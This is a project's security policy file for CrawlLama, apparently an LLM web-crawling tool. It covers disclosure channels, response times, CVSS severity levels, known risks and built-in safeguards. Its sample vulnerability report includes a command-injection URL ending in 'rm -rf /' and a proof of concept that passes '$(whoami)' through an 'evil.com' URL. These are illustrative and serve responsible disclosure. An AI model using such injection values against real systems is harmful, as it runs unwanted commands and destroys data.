
# Security Policy

---

📚 **Navigation:** [README](README.md) | [Contributing](CONTRIBUTING.md) | [Docs](docs/README.md) | [Changelog](CHANGELOG.md)

---

## Security Policy

The security of CrawlLama is important to us. If you discover a vulnerability, please report it responsibly.

## Supported Versions

We provide security updates for the following versions:

| Version | Supported          |
| ------- | ------------------ |
| 1.4.x   | :white_check_mark: |
| 1.3.x   | :x:                |
| 1.2.x   | :x:                |
| < 1.2   | :x:                |

## Reporting Vulnerabilities

### Please DO NOT report publicly

**Do NOT create public GitHub Issues for vulnerabilities.** This could put other users at risk.

### Responsible Disclosure

Please report vulnerabilities responsibly via:

#### GitHub Security Advisory (preferred)

1. Go to [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)
2. Click "Report a vulnerability"
3. Fill out the form with details

#### Email (alternative for sensitive leaks)

- **Email**: [crawllama.support@protonmail.com](mailto:crawllama.support@protonmail.com)
- **Subject**: `[SECURITY] Short Description`
- **Encryption**: Proton Mail offers end-to-end encryption

### What should the report include?

Please provide as many details as possible:

- **Type of vulnerability** (e.g. Code Injection, XSS, Arbitrary File Read)
- **Affected version(s)**
- **Steps to reproduce**
- **Proof of Concept (PoC)** code or screenshot
- **Potential impact** (e.g. RCE, data leak, DoS)
- **Suggested solution** (optional)
- **CVE-ID** (if already available)

**Example:**

```markdown
**Vulnerability:** Command Injection in page_reader.py

**Version:** v1.3.0

**Description:**
The function `fetch_page()` in `tools/page_reader.py` does not properly validate user input, which can lead to command injection.

**Steps:**
1. Start CrawlLama
2. Enter the following URL: `http://example.com; rm -rf /`
3. Command is executed on the system

**Impact:**
Remote Code Execution (RCE) as the user running CrawlLama

**PoC:**
```python
from tools.page_reader import fetch_page
fetch_page("http://evil.com$(whoami)")
```

**Suggestion:**
URL validation with `validators.url()` before processing
```

### Response Times

We strive for the following response times:

- **Initial response**: Within 48 hours
- **First assessment**: Within 7 days
- **Fix for critical issues**: Within 30 days
- **Fix for moderate issues**: Within 90 days

## Severity Levels

We use the [CVSS v3.1](https://www.first.org/cvss/calculator/3.1) scoring system:

| Severity    | CVSS Score | Examples                  |
|-------------|------------|---------------------------|
| **Critical**| 9.0-10.0   | RCE, Authentication Bypass|
| **High**    | 7.0-8.9    | SQL Injection, XSS        |
| **Medium**  | 4.0-6.9    | CSRF, Information Disclosure|
| **Low**     | 0.1-3.9    | Minor Information Leaks   |

## Known Security Risks

### Local Operation Required

CrawlLama is designed for **local operation**. If exposed publicly (e.g. via FastAPI):

⚠️ **Important Security Measures:**

1. **Authentication**: Implement API key authentication
2. **Rate Limiting**: Use the built-in rate limiting (`security.rate_limit`)
3. **Input Validation**: All user inputs are validated
4. **Firewall**: Expose API only via firewall/reverse proxy
5. **HTTPS**: Use TLS for encrypted communication

### Web Scraping Risks

- **Malicious Content**: Websites may contain harmful content
- **SSRF**: Server-Side Request Forgery via user-controlled URLs
- **DoS**: Infinite redirects or large downloads

**Mitigation:**
- Domain blacklist enabled (`data/blacklist.txt`)
- Timeout limits configured
- Max response size limited
- robots.txt is respected

### LLM-specific Risks

- **Prompt Injection**: Malicious prompts in search results
- **Data Poisoning**: False information in RAG database
- **Model Hallucination**: Generated misinformation

**Mitigation:**
- Hallucination detection enabled (`core/hallu_detect.py`)
- Output sanitization
- Source attribution

### Dependency Vulnerabilities

We monitor dependencies regularly:

```bash
# Check dependencies
pip-audit
safety check

# Or with our script
python scripts/check_dependencies.py
```

**Automatic updates:** Dependabot is enabled and creates PRs for security updates.

## Security Features

CrawlLama has the following built-in security features:

### 1. Input Validation

```python
# utils/validators.py
validate_url()        # Check URL format
validate_query()      # Check query length/content
sanitize_output()     # Clean LLM output
```

### 2. Rate Limiting

```python
# config.json
"security": {
  "rate_limit": 1.0,  # Requests per second
  "check_robots_txt": true
}
```

### 3. Domain Blacklist

```python
# data/blacklist.txt
# Blocks known malicious domains
malware-site.com
phishing-domain.net
```

### 4. Secure Config

```python
# API keys are stored encrypted
from utils.secure_config import SecureConfig
config = SecureConfig()
config.set_key("api_key", "secret")  # Encrypted
```

### 5. Plugin Sandbox

```python
# Plugins run in a separate namespace
# No access to sensitive data
```

## Security Best Practices

### For Users

1. **Do not commit secrets**: Use `.env` for API keys
2. **Do not expose API**: Local access only recommended
3. **Install updates**: Keep CrawlLama up to date
4. **Be careful with URLs**: Check sources before adding
5. **Monitor logs**: Check `logs/app.log` regularly

### For Developers

1. **Validate input**: Use `validators.py` for all inputs
2. **Sanitize output**: Clean LLM outputs before display
3. **Keep secrets out of code**: Never in code, always in `.env`
4. **Check dependencies**: Run `pip-audit` before every release
5. **Write tests**: Test security-relevant features

## Security Checklist Before Release

- [ ] `pip-audit` shows no critical/high vulnerabilities
- [ ] No secrets committed in code/config
- [ ] `.env.example` contains only placeholders
- [ ] Domain blacklist updated
- [ ] Rate limiting enabled
- [ ] Input validation for all user inputs
- [ ] Output sanitization for LLM responses
- [ ] Security tests pass
- [ ] Documentation updated

## Disclosure Policy

After fixing a vulnerability:

1. **Security advisory** is published on GitHub
2. **CVE** is requested (for high/critical)
3. **Release notes** mention the fix (without details)
4. **Credits** for the reporter (if desired)
5. **30-day waiting period** before full disclosure

## Hall of Fame

We thank the following security researchers for responsible disclosure:

<!-- 
Example format:
- **[Name]** - [Vulnerability Type] - [Month Year]
-->

*No reports yet - be the first!*

## Bug Bounty Program

Currently, we have **no official bug bounty program**.

However, we honor all security reports with:
- **Public credits** (if desired)
- **Mention in release notes**
- **Hall of Fame entry**

## Contact

- **GitHub Security**: [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)

## Further Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [Responsible Disclosure Policy](https://en.wikipedia.org/wiki/Responsible_disclosure)

---

**Thank you for helping keep CrawlLama secure!** 🔒
